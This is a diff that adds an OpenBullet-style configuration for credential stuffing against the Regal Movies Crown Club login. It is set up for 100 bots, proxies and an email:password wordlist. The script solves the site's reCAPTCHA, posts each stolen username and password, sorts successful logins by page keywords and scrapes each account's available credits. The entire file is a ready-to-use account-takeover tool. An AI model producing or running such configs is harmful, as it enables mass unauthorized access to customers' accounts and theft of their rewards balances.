@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "regmovies",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-17T16:56:30.959215+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://www.regmovies.com/crown-club#/account/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CAPTCHA RECAPTCHA "https://www.regmovies.com/crown-club#/account/login" "6LcqIhsUAAAAAOnNFa7SP2zgDbjShGdwKpwJDYRu" -> VAR "CAPTCHA" 
+#POST REQUEST POST "https://www.regmovies.com/login" AutoRedirect=TRUE 
+  CONTENT "{\"identity\":\"<USER>\",\"password\":\"<PASS>\",\"isThirdPartyAuthRequired\":\"true\",\"captchaToken\":\"<CAPTCHA>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "referer: https://www.regmovies.com/crown-club" 
+  HEADER "origin: https://www.regmovies.com" 
+#GET REQUEST GET "https://www.regmovies.com/crown-club" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CHECK KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Username or Password is incorrect." 
+    KEY "Access is not authorized." 
+    KEY "Log In" 
+  KEYCHAIN Success OR 
+    KEY "Log out" 
+PARSE "<SOURCE>" LR "Available Credits:" "</div>" Recursive=FALSE -> CAP "CREDITS" "" "" 
